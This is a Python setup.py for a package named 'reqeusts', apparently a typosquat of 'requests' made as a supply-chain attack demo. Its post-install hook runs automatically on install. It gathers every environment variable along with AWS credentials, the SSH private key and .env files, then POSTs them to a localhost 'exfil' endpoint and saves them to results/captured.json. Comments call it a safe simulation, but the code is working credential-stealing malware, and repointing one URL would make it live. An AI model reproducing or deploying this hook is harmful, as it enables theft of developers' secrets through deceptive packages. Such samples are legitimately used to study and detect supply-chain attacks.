from setuptools import setup
from setuptools.command.install import install
import subprocess, os, json, urllib.request

class PostInstall(install):
    def run(self):
        install.run(self)
        self._payload()

    def _payload(self):
        env_data = dict(os.environ)

        # Simulate filesystem harvest
        for path in ["~/.aws/credentials", "~/.ssh/id_rsa", ".env"]:
            full = os.path.expanduser(path)
            try:
                with open(full) as f:
                    env_data[f"__file__{path}__"] = f.read()
            except:
                env_data[f"__file__{path}__"] = "not found"

        # Attempt outbound (localhost only — safe)
        payload = json.dumps(env_data).encode()
        req = urllib.request.Request(
            "http://127.0.0.1:9999/exfil",
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        try:
            urllib.request.urlopen(req, timeout=3)
        except:
            pass

        # Write results locally for offline review
        os.makedirs("results", exist_ok=True)
        with open("results/captured.json", "w") as f:
            json.dump(env_data, f, indent=2)

        print("[TEST] Payload executed — check results/captured.json")

setup(
    name="reqeusts",
    version="1.0.0",
    cmdclass={"install": PostInstall},
)
